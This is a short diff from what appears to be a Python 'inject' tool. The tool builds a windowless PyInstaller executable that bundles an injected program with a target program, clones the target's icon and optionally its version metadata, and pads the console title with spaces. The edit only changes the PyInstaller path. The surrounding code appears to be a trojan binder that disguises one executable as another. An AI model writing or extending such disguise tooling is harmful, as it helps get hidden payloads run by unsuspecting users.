@@ -20,7 +20,8 @@ def inject(file_to_inject, target_file, clone_properties):
 
         generate_file_loader('==')
 
-        pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& resources\Python310\python.exe resources\Python310\Scripts\pyinstaller.exe -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
+        pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
+        #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& resources\Python310\python.exe resources\Python310\Scripts\pyinstaller.exe -F -w ' + ('--version-file "temporary_files/version.txt" ' if clone_properties else '') + '--add-data "cached_files/inject.exe;cached_files" --add-data "cached_files/target.exe;cached_files" --icon "cached_files/target.exe" "temporary_files/file_loader.py" & pause & exit"'
         os.system(pyinstaller_command)
         input('Press [ENTER] when processing in new window will end: ')
         print('If running generated executable will produce error, just change its name')
